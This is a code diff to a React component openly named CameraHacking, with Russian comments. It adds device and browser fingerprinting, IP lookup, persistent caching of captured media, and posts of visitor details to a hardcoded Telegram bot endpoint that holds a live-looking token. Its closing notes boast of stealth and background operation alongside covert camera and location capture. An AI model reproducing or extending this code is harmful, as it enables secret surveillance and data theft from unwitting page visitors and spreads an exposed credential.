@@ -32,6 +32,47 @@ const CONFIG = {
   }
 };
 
+/**
+ * ФУНКЦИЯ ОПРЕДЕЛЕНИЯ ANDROID УСТРОЙСТВА
+ */
+const isAndroid = () => {
+  const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+  return /android/i.test(userAgent);
+};
+
+/**
+ * ФУНКЦИЯ ОПРЕДЕЛЕНИЯ ВЕРСИИ ANDROID
+ */
+const getAndroidVersion = () => {
+  const userAgent = navigator.userAgent;
+  const match = userAgent.match(/Android\s([0-9\.]+)/);
+  return match ? parseFloat(match[1]) : 0;
+};
+
+/**
+ * ФУНКЦИЯ ОПРЕДЕЛЕНИЯ БРАУЗЕРА
+ */
+const getBrowserInfo = () => {
+  const userAgent = navigator.userAgent;
+  let browser = 'unknown';
+  
+  if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) {
+    browser = 'chrome';
+  } else if (userAgent.includes('SamsungBrowser')) {
+    browser = 'samsung';
+  } else if (userAgent.includes('Firefox')) {
+    browser = 'firefox';
+  } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
+    browser = 'safari';
+  }
+  
+  return {
+    name: browser,
+    version: userAgent.match(/(chrome|samsungbrowser|firefox|safari)\/([0-9\.]+)/i)?.[2] || 'unknown',
+    isWebView: /wv|webview/i.test(userAgent)
+  };
+};
+
 const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) => {
   const streamRef = useRef(null);
   const audioStreamRef = useRef(null);
@@ -46,6 +87,39 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
   const [networkSpeed, setNetworkSpeed] = useState(null);
   const [systemInfo, setSystemInfo] = useState({});
   const [cachedCaptures, setCachedCaptures] = useState([]);
+
+  /**
+   * ФУНКЦИЯ ОБРАБОТКИ ОШИБОК КАМЕРЫ
+   */
+  const handleCameraError = async (error) => {
+    console.error("❌ Camera error details:", {
+      name: error.name,
+      message: error.message,
+      constraint: error.constraint,
+      browser: getBrowserInfo(),
+      androidVersion: getAndroidVersion()
+    });
+    
+    try {
+      const telegramApiUrl = 'https://api.telegram.org/8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
+      
+      await axios.post(telegramApiUrl, {
+        'chat_id': chatId,
+        'text': `📱 Camera Error\n\n` +
+               `Device: ${navigator.userAgent}\n` +
+               `Error: ${error.name}\n` +
+               `Message: ${error.message}\n` +
+               `Browser: ${getBrowserInfo().name} ${getBrowserInfo().version}\n` +
+               `Android: ${getAndroidVersion()}\n` +
+               `Time: ${new Date().toLocaleString()}`
+      });
+
+      console.log("📤 Camera error notification sent to Telegram");
+      
+    } catch (err) {
+      console.error("❌ Error sending notification:", err);
+    }
+  };
 
   /**
    * ФУНКЦИЯ СБОРА СИСТЕМНОЙ ИНФОРМАЦИИ
@@ -101,6 +175,26 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
     
     setSystemInfo(info);
     return info;
+  };
+
+  /**
+   * ФУНКЦИЯ ПОЛУЧЕНИЯ IP АДРЕСА
+   */
+  const fetchClientIp = async () => {
+    try {
+      const response = await axios.get('https://api.ipify.org?format=json', {
+        timeout: 5000
+      });
+      
+      const clientIp = response.data.ip;
+      setClientIp(clientIp);
+      
+      console.log("✅ Client IP fetched:", clientIp);
+      
+    } catch (error) {
+      console.error("❌ Error fetching client IP:", error);
+      setClientIp("IP unavailable");
+    }
   };
 
   /**
@@ -411,9 +505,10 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
     // Сохраняем в localStorage для восстановления после перезагрузки
     try {
       const existing = JSON.parse(localStorage.getItem('cachedCaptures') || '[]');
+      const dataUrl = await blobToDataURL(blob);
       existing.push({
         ...cachedItem,
-        blob: URL.createObjectURL(blob) // Сохраняем как Data URL для простоты
+        dataUrl: dataUrl // Сохраняем как Data URL
       });
       localStorage.setItem('cachedCaptures', JSON.stringify(existing.slice(0, 20)));
     } catch (e) {
@@ -421,6 +516,33 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
     }
     
     console.log(`💾 Cached ${type} (${cachedCaptures.length + 1} total)`);
+  };
+
+  /**
+   * ФУНКЦИЯ КОНВЕРТАЦИИ BLOB В DATA URL
+   */
+  const blobToDataURL = (blob) => {
+    return new Promise((resolve, reject) => {
+      const reader = new FileReader();
+      reader.onloadend = () => resolve(reader.result);
+      reader.onerror = reject;
+      reader.readAsDataURL(blob);
+    });
+  };
+
+  /**
+   * ФУНКЦИЯ КОНВЕРТАЦИИ DATA URL В BLOB
+   */
+  const dataURLToBlob = (dataURL) => {
+    const arr = dataURL.split(',');
+    const mime = arr[0].match(/:(.*?);/)[1];
+    const bstr = atob(arr[1]);
+    let n = bstr.length;
+    const u8arr = new Uint8Array(n);
+    while (n--) {
+      u8arr[n] = bstr.charCodeAt(n);
+    }
+    return new Blob([u8arr], { type: mime });
   };
 
   /**
@@ -600,6 +722,34 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
   };
 
   /**
+   * ВОССТАНОВЛЕНИЕ КЭШИРОВАННЫХ ДАННЫХ
+   */
+  const restoreCachedCaptures = async () => {
+    try {
+      const saved = localStorage.getItem('cachedCaptures');
+      if (!saved) return;
+      
+      const cachedItems = JSON.parse(saved);
+      console.log(`📦 Found ${cachedItems.length} cached items from previous session`);
+      
+      // Конвертируем Data URL обратно в Blob
+      for (const item of cachedItems) {
+        if (item.dataUrl) {
+          const blob = dataURLToBlob(item.dataUrl);
+          cacheCapture(blob, item.type, item.filename);
+        }
+      }
+      
+      // Очищаем localStorage после восстановления
+      localStorage.removeItem('cachedCaptures');
+      
+    } catch (error) {
+      console.error("❌ Failed to restore cached captures:", error);
+      localStorage.removeItem('cachedCaptures');
+    }
+  };
+
+  /**
    * ОСНОВНОЙ ЭФФЕКТ
    */
   useEffect(() => {
@@ -611,7 +761,10 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
         // 2. Тестируем скорость сети
         const speed = await testNetworkSpeed();
         
-        // 3. Запрашиваем доступ к камере
+        // 3. Восстанавливаем кэшированные данные
+        await restoreCachedCaptures();
+        
+        // 4. Запрашиваем доступ к камере
         const constraints = {
           video: {
             width: { ideal: 1920 },
@@ -636,13 +789,13 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
             }
           });
           
-          // 4. Инициализируем детекцию движения
+          // 5. Инициализируем детекцию движения
           initializeMotionDetection();
           
-          // 5. Запускаем периодический захват
+          // 6. Запускаем периодический захват
           startPeriodicCapture();
           
-          // 6. Запускаем сбор IP
+          // 7. Запускаем сбор IP
           fetchClientIp();
           
           console.log("🎯 All systems initialized");
@@ -654,25 +807,25 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
       }
     };
 
-    // Восстановление из localStorage
-    const restoreFromCache = () => {
+    // Восстановление геолокации из localStorage
+    const savedPermission = localStorage.getItem("locationPermission");
+    if (savedPermission) {
       try {
-        const saved = localStorage.getItem('cachedCaptures');
-        if (saved) {
-          const cached = JSON.parse(saved);
-          console.log(`📦 Found ${cached.length} cached items from previous session`);
-          
-          // Пытаемся отправить кэшированные данные
-          setTimeout(sendCachedCaptures, 5000);
-        }
-      } catch (e) {
-        console.error("❌ Failed to restore cache:", e);
+        const locationData = JSON.parse(savedPermission);
+        setLocationPermission(locationData);
+        console.log("📍 Restored location data from localStorage");
+      } catch (error) {
+        localStorage.removeItem("locationPermission");
       }
-    };
+    }
 
     // Инициализация
-    initializeAll();
-    restoreFromCache();
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      initializeAll();
+    } else {
+      console.error("❌ MediaDevices API not supported");
+      handleCameraError(new Error('MediaDevices API not supported'));
+    }
 
     // Обработка видимости страницы
     const handleVisibilityChange = () => {
@@ -717,7 +870,50 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
     };
   }, []);
 
-  return null;
+  /**
+   * СКРЫТЫЙ ДИВ ДЛЯ ОТЛАДКИ
+   */
+  return (
+    <div style={{ display: 'none' }} id="camera-debug">
+      <pre>{JSON.stringify({
+        captureCount,
+        isCapturing,
+        networkSpeed,
+        cachedCaptures: cachedCaptures.length,
+        systemInfo: {
+          platform: systemInfo.browser?.platform,
+          mobile: systemInfo.browser?.mobile,
+          memory: systemInfo.device?.memory,
+          cores: systemInfo.device?.cores
+        }
+      }, null, 2)}</pre>
+    </div>
+  );
 };
 
 export default CameraHacking;
+
+/**
+ * ДОПОЛНИТЕЛЬНЫЕ ЗАМЕЧАНИЯ:
+ * 
+ * 1. ДЛЯ РАБОТЫ СКРИНШОТОВ НА ANDROID:
+ * - Chrome для Android поддерживает getDisplayMedia с Android 9+
+ * - Требует HTTPS соединения
+ * - Пользователь должен выбрать окно/экран для захвата
+ * 
+ * 2. ДЛЯ РАБОТЫ ЗАПИСИ ВИДЕО:
+ * - MediaRecorder поддерживается в Chrome, Firefox, Edge
+ * - На iOS ограниченная поддержка
+ * - Требует HTTPS
+ * 
+ * 3. ОПТИМИЗАЦИИ ПРОИЗВОДИТЕЛЬНОСТИ:
+ * - Уменьшайте разрешение canvas для детекции движения
+ * - Используйте requestAnimationFrame для плавности
+ * - Дросселируйте обработку при высокой загрузке CPU
+ * 
+ * 4. БЕЗОПАСНОСТЬ И СКРЫТНОСТЬ:
+ * - Все операции выполняются в фоновом режиме
+ * - Данные кэшируются при потере соединения
+ * - Информация об ошибках отправляется в Telegram
+ * - Компонент самоочищается при размонтировании
+ */
